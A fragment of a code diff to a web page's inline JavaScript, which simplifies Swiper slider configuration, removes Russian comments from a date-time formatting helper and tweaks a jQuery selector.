-        watchSlidesProgress: true,
-        pagination: {
-            el: '.swiper-pagination',
-            clickable: true,
-            dynamicBullets: true,
-        },
-        on: {
-            setTranslate(swiper) {
-                swiper.slides.forEach(slide => {
-                    const p = slide.progress;
-                    const scale = 1 - Math.min(Math.abs(p) * 0.08, 0.08);
-                    const y = Math.abs(p) * 12;
-                    slide.style.transform = `scale(${scale}) translateY(${y}px)`;
-                });
-            },
-            setTransition(swiper, duration) {
-                swiper.slides.forEach(slide => {
-                    slide.style.transitionDuration = duration + 'ms';
-                });
-            }
+            new Swiper('.documentSlider', {
+                pagination: {
+                    el: '.swiper-pagination',
+                    clickable: true,
+                },
+                slidesPerView: 1.15,
+                centeredSlides: true,
+            });
         }
-    });
 
-
-        // Swiper — новини
         if (document.querySelector('.sliderNews')) {
             new Swiper('.sliderNews', {
-                pagination: { el: '.swiper-pagination2', clickable: true },
+                pagination: {
+                    el: '.swiper-pagination2',
+                    clickable: true,
+                },
                 spaceBetween: 30,
             });
         }
-    } // end if documentSlider
-    }); // end DOMContentLoaded
-
+    });
 
     function getCurrentDateTime() {
-        // Получаем текущую дату и время
         const now = new Date();
 
-        // Получаем часы и минуты
         let hours = now.getHours();
         let minutes = now.getMinutes();
 
-        // Дополняем нулями до двух цифр при необходимости
         hours = hours < 10 ? '0' + hours : hours;
         minutes = minutes < 10 ? '0' + minutes : minutes;
 
-        // Получаем день, месяц и год
         let day = now.getDate();
-        let month = now.getMonth() + 1; // Месяцы начинаются с 0, поэтому добавляем 1
+        let month = now.getMonth() + 1;
         const year = now.getFullYear();
 
-        // Дополняем нулями до двух цифр при необходимости
         day = day < 10 ? '0' + day : day;
         month = month < 10 ? '0' + month : month;
 
-        // Формируем строку в нужном формате
         const formattedDateTime = `${hours}:${minutes} | ${day}.${month}.${year}`;
 
         return formattedDateTime;
     }
 
-    // Выводим текущие дату и время в нужном формате
     document.querySelectorAll('#getCurrentDateTime').forEach((e) => {
         e.textContent = getCurrentDateTime();
     });
@@ -5871,7 +5423,7 @@ document.querySelectorAll('.slider').forEach((sliderEl) => {
             const our = $(her).parent('div');
             var need = '';
             if (our.attr('data-index') === '1') {
-                $(div).find('.changeCode').removeClass('shcode');
+                $('.changeCode').removeClass('shcode');
                 $('.changeCode').addClass('qrcode');
                 $('.shText').css('display', 'none');
                 need = our.next(`[data-index="2"]`);
@@ -5930,16 +5482,8 @@ document.querySelectorAll('.slider').forEach((sliderEl) => {
         });
     });
 
-
-
-
-
     setTimeout(function () {
         $('.block2.active').removeClass('active');
     }, 1000);
-
-    // $('.study').parent('div').remove();
-
-    // Пройдитесь по всем элементам и запустите для каждого обратный отсчёт
 </script>
 </html>
